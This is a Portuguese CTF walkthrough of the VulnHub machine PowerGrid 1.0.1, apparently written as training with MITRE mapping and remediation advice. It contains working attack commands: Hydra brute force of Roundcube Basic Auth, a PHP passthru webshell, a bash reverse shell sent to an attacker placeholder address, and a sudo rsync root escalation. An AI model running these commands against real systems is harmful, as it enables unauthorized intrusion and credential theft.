# PowerGrid: 1.0.1 — Hackeia a Rede Antes que Ela te Hackeie

Mano, essa máquina é legit uma das experiências de CTF mais em camadas do VulnHub. PowerGrid: 1.0.1 não é uma caixa linear simples. É uma cadeia de ataque completa: força bruta de HTTP Basic Auth no webmail Roundcube, RCE autenticado via EDB-40892, movimento lateral através de descriptografia PGP para recuperar chave SSH, pivotamento em container Docker, e finalmente root via sudo rsync GTFOBin. Cada estágio exige um conjunto de habilidades distinto. Sem mentira, essa separa a galera do "sei usar nmap" das pessoas que realmente entendem escalada de privilégios em camadas.

Grande respeito ao criador por construir algo que espelha infraestrutura do mundo real: servidores de webmail, containers Docker, pivotamento de rede e criptografia, tudo numa máquina.

| Campo | Valor |
|---|---|
| **Nível** | Difícil |
| **VM Alvo** | PowerGrid: 1.0.1 |
| **VM Atacante** | Kali Linux 2024.x |
| **URL VulnHub** | https://www.vulnhub.com/entry/powergrid-101,485/ |
| **Técnicas** | Força bruta HTTP Basic Auth, RCE Roundcube (EDB-40892), webshell PHP, descriptografia PGP, descoberta de rede Docker, pivotamento SSH, GTFOBin sudo rsync |
| **CVEs** | CVE-2017-16651 (RCE Roundcube) |
| **Grupos APT** | Sandworm (notório por atacar infraestrutura energética com cadeias de intrusão em camadas); APT33/OilRig (visa webmail e sistemas VPN do setor de energia como vetores de acesso inicial) |

---

## Resumo do Ataque

```
nmap → HTTP (80), webmail Roundcube (protegido por HTTP Basic Auth)
  → Browse http://alvo/ → listagem de diretório → usuários: deez1, p48, all2
  → dirsearch → /roundcube/ (HTTP Basic Auth)
  → hydra -L users.txt -P rockyou.txt → credenciais válidas
  → Login Roundcube → EDB-40892 RCE autenticado
  → Upload webshell → reverse shell como www-data
  → encontrar flags 1+2
  → su p48 (reutilização de senha do webmail)
  → gpg --import chave p48 → gpg --decrypt email → chave privada SSH
  → ip route → bridge Docker 172.17.0.0/16
  → ping sweep → container Docker em 172.17.0.x
  → ssh -i chave_recuperada user@172.17.0.x → shell no container
  → sudo -l → (root) NOPASSWD: /usr/bin/rsync
  → GTFOBin sudo rsync → root
  → cat /root/flag3.txt /root/flag4.txt
```

---

## Metodologia

1. Descoberta do host e scan completo de portas
2. Enumeração web: descobrir lista de usuários e webmail Roundcube
3. Força bruta HTTP Basic Auth com Hydra
4. RCE autenticado Roundcube (EDB-40892)
5. Upload de webshell PHP e reverse shell como www-data
6. Coleta da flag 1
7. Movimento lateral para p48 via reutilização de senha
8. Descriptografia PGP: recuperar chave privada SSH do e-mail criptografado
9. Descoberta de rede Docker via ip route
10. Pivotamento SSH para dentro do container Docker
11. Escalada root via GTFOBin sudo rsync
12. Coleta das flags 2, 3, 4

---

## Passo 1 — Descoberta do Host e Scan Completo

```bash
sudo netdiscover -i eth0
# Adicionar ao /etc/hosts:
echo "192.168.56.x powergrid.vh" >> /etc/hosts

nmap -A -p- powergrid.vh
```

Achados principais: serviço HTTP na porta 80 com listagem de diretório habilitada, e potencialmente outros serviços. O serviço web expõe a superfície de ataque.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web: Descoberta de Usuários

Navegar para `http://powergrid.vh/`. A página contém uma listagem de diretório ou menção explícita de três usuários:

- `deez1`
- `p48`
- `all2`

Salvar numa wordlist para força bruta:

```bash
echo -e "deez1\np48\nall2" > /tmp/users.txt
```

Executar enumeração de diretórios:

```bash
dirsearch -u http://powergrid.vh/ -e php,html,txt
# ou: gobuster dir -u http://powergrid.vh/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Um diretório protegido por HTTP Basic Authentication é descoberto, contendo o webmail Roundcube.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Força Bruta HTTP Basic Auth com Hydra

```bash
hydra -L /tmp/users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      powergrid.vh \
      http-get /CAMINHO_ROUNDCUBE/ \
      -t 16
```

Credenciais válidas encontradas. Anota.

**Alternativa:** `medusa -h powergrid.vh -U /tmp/users.txt -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/CAMINHO_ROUNDCUBE/ -m AUTH:BASIC`

**Nota do mundo real:** HTTP Basic Auth ainda é usado em muitas ferramentas corporativas internas, painéis admin legados e ambientes de desenvolvimento. Sem políticas de bloqueio, força bruta com rockyou.txt consegue em minutos. APT33 foi observado fazendo força bruta em webmail como acesso inicial primário em campanhas do setor de energia.

**MITRE ATT&CK:** T1110.003 — Força Bruta: Password Spraying; T1078 — Contas Válidas

---

## Passo 4 — RCE Roundcube (EDB-40892)

Fazer login no Roundcube com as credenciais descobertas.

A versão do Roundcube é vulnerável a Execução Remota de Código autenticada (Exploit-DB 40892). Essa vulnerabilidade permite que um usuário autenticado execute código PHP arbitrário.

```bash
# Localizar o exploit
searchsploit roundcube
searchsploit -m 40892

# Revisar e adaptar o exploit
# O exploit tipicamente cria um arquivo PHP via API de verificação ortográfica do Roundcube
```

Verificar execução de código checando se um arquivo de teste foi criado:

```bash
curl http://powergrid.vh/CAMINHO/test.php
```

**MITRE ATT&CK:** T1190 — Explorar Aplicação Pública

---

## Passo 5 — Webshell PHP e Reverse Shell

Fazer upload de webshell PHP via o RCE:

```bash
# Webshell simples
echo '<?php passthru($_GET["cmd"]); ?>' > /tmp/shell.php

# Verificar execução
curl "http://powergrid.vh/CAMINHO/shell.php?cmd=id"
# www-data
```

Fazer upgrade para reverse shell completo:

```bash
# Iniciar listener
nc -lvnp 4444

# Reverse shell bash codificado em URL
curl "http://powergrid.vh/CAMINHO/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/IP_ATACANTE/4444+0>%261'"
```

Estabilizar:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

Verificar flags iniciais:

```bash
find / -name "flag*" 2>/dev/null
cat /CAMINHO/flag1.txt
```

**MITRE ATT&CK:** T1059.004 — Shell Unix; T1505.003 — Web Shell

---

## Passo 6 — Movimento Lateral para p48 via Reutilização de Senha

Verificar a caixa de entrada do Roundcube para o usuário autenticado. Há um e-mail criptografado com PGP na caixa de entrada.

Tentar mudar para o usuário `p48` usando a senha do webmail (reutilização de senha):

```bash
su p48
# Digitar a senha do webmail
```

Mudança funciona. Reutilização de senha entre webmail e contas do sistema é a ponte para o próximo estágio.

```bash
ls -la /home/p48/
# diretório .gnupg/ presente
# pgp_message.asc — e-mail criptografado
```

**MITRE ATT&CK:** T1078.003 — Contas Válidas: Contas Locais; T1552.001 — Credenciais em Arquivos

---

## Passo 7 — Descriptografia PGP para Recuperar Chave SSH

Importar a chave privada GPG do p48:

```bash
gpg --import /home/p48/.gnupg/private-key.asc
```

Descriptografar o e-mail PGP (a senha é a mesma do webmail/sistema):

```bash
gpg --decrypt /home/p48/pgp_message.asc
# Digitar a senha quando solicitado
```

A saída descriptografada contém uma chave privada SSH. Salvar:

```bash
# Na máquina atacante, salvar a chave
vim /tmp/docker_id_rsa
# Colar a chave privada
chmod 600 /tmp/docker_id_rsa
```

**Nota do mundo real:** Criptografia GPG é frequentemente usada para proteger materiais sensíveis, mas quando a senha é a mesma que uma credencial conhecida (reutilização de senha), a criptografia não oferece segurança real. O Sandworm usou técnicas similares de cadeia de credenciais em várias intrusões em ICS/SCADA.

**MITRE ATT&CK:** T1552.004 — Credenciais em Arquivos: Chaves Privadas

---

## Passo 8 — Descoberta de Rede Docker

A partir do shell do www-data ou p48, descobrir a rede bridge do Docker:

```bash
ip route
# Procurar pela bridge Docker: ex., 172.17.0.0/16
```

Fazer ping sweep rápido para encontrar o container Docker:

```bash
for i in $(seq 1 10); do
  (ping -c1 -W1 172.17.0.$i &>/dev/null && echo "172.17.0.$i up") &
done
wait
```

Identificar o IP do container (geralmente 172.17.0.2 ou similar).

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede; T1599 — Ponte de Limite de Rede

---

## Passo 9 — Pivotamento SSH para Dentro do Container Docker

Da máquina atacante (ou via shell no host usando a chave):

```bash
ssh -i /tmp/docker_id_rsa user@172.17.0.x
```

Um shell abre dentro do container Docker. Ler flags dentro do container:

```bash
find / -name "flag*" 2>/dev/null
cat /CAMINHO/flag2.txt
```

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH; T1610 — Implantar Container

---

## Passo 10 — Escalada Root via GTFOBin sudo rsync

Dentro do container Docker, verificar permissões sudo:

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/rsync
```

Usar a técnica GTFOBins do `rsync` para gerar um shell root:

```bash
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

Shell root obtido dentro do container. Ler as flags finais:

```bash
id
# uid=0(root) gid=0(root)

cat /root/flag3.txt
cat /root/flag4.txt
```

(☞ﾟヮﾟ)☞ Root. Todas as 4 flags capturadas.

**Nota do mundo real:** `sudo rsync` sem restrição de senha é um vetor bem documentado no GTFOBins. É o tipo de configuração que é definida durante a configuração inicial do container Docker por "conveniência" e nunca revisada. Sandworm e APT28 aproveitam ferramentas legítimas do sistema para escalada de privilégios para evitar acionar assinaturas de AV/EDR.

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | usernames deez1/p48/all2 | Listagem de diretório web | Alvo de força bruta |
| Credencial | (creds webmail) | Força bruta Hydra contra HTTP Basic Auth | Login Roundcube |
| Credencial | senha sistema p48 | Mesma que senha webmail (reutilização) | su p48 |
| Chave SSH | chave privada container Docker | E-mail descriptografado via PGP | SSH para container Docker |
| Flag 1 | (varia) | Web root após RCE | Capturada via shell |
| Flag 2 | (varia) | Sistema de arquivos container Docker | Capturada via pivotamento SSH |
| Flag 3 | (varia) | /root/ no container | Capturada após root sudo |
| Flag 4 | (varia) | /root/ no container | Capturada após root sudo |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Aprendizado Chave |
|---|---|---|---|
| 1 | Força bruta HTTP Basic Auth: sem política de bloqueio | Redes industriais e de setor de energia usam HTTP Basic Auth em interfaces web legadas | Implementar bloqueio de conta; exigir credenciais fortes; adicionar limitação de taxa por IP |
| 2 | RCE Roundcube (EDB-40892): webmail desatualizado | Servidores de webmail são alvos de alto valor para acesso inicial | Manter plataformas de webmail em versões atuais; isolar webmail de redes internas |
| 3 | Reutilização de senha: senha webmail = senha sistema = senha PGP | Uma senha comprometida desbloqueou três camadas distintas de autenticação | Impor senhas únicas por serviço; usar gerenciador de senhas; MFA em todas as contas |
| 4 | Senha PGP igual à credencial conhecida | Artefatos criptografados são tão seguros quanto sua senha | Usar senhas fortes e únicas para material criptográfico; separar das senhas do sistema |
| 5 | Rede container Docker acessível do host | Falhas de isolamento de rede de containers permitem movimento lateral | Impor políticas de rede; isolar redes bridge do Docker; usar VLANs separadas para containers |
| 6 | sudo rsync NOPASSWD no container | GTFOBins documenta rsync como vetor de shell root | Remover entradas sudo NOPASSWD; exigir senhas; restringir a comandos específicos seguros |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Força Bruta: Password Spraying | T1110.003 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Pública | T1190 |
| Execução | Execução | Interpretador: Shell Unix | T1059.004 |
| Execução | Execução | Componente de Software Servidor: Web Shell | T1505.003 |
| Acesso a Credenciais | Acesso | Contas Válidas: Contas Locais | T1078.003 |
| Acesso a Credenciais | Acesso | Credenciais em Arquivos: Chaves Privadas | T1552.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Movimento Lateral | Lateral | Serviços Remotos: SSH | T1021.004 |
| Movimento Lateral | Lateral | Ponte de Limite de Rede | T1599 |
| Escalada de Privilégios | Escalada | Abuso de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Atualizar o webmail Roundcube** para uma versão corrigida; remover superfície de ataque do EDB-40892
2. **Implementar bloqueio de conta** no HTTP Basic Auth (Fail2ban ou equivalente)
3. **Impor senhas únicas por serviço** para todos os usuários; implantar gerenciador de senhas
4. **Isolar redes bridge do Docker** do host e entre si usando políticas de rede
5. **Remover entradas sudo NOPASSWD** em todos os containers; exigir senhas para todo uso de sudo
6. **Auditar senhas PGP** para garantir que diferem das credenciais do sistema

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar webmail, containers Docker e serviços internos |
| Proteger | Controle de Acesso | Implementar bloqueio; impor credenciais únicas; MFA no webmail |
| Proteger | Gerenciamento de Identidade | Separar senhas de material criptográfico |
| Detectar | Anomalias e Eventos | Alertar sobre tentativas de força bruta HTTP Basic Auth; monitorar tráfego de rede Docker |
| Responder | Planejamento de Resposta | Isolar containers comprometidos; rotacionar todas as credenciais |
| Recuperar | Planejamento de Recuperação | Reconstruir containers comprometidos; revisar todas as configurações sudo |

---

## Considerações Finais

PowerGrid: 1.0.1 é uma obra-prima de complexidade em camadas. Cada estágio exige que você realmente entenda o que está fazendo, não apenas execute uma ferramenta e torça para funcionar. A cadeia PGP-para-SSH é particularmente inteligente: testa se você entende gerenciamento de chaves criptográficas além do pivotamento de rede. O ângulo do container Docker espelha exatamente o que defensores veem em infraestrutura moderna de nuvem e containers.

Se você completou essa máquina: agora tem experiência prática com exploração de webmail, recuperação criptográfica de credenciais, pivotamento de rede Docker e escalada de privilégios via GTFOBins. Isso é uma pilha de habilidades séria, véi.

GG mano, foi uma batalha e você merece. (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧

Thanks guys!! (❍ᴥ❍ʋ)
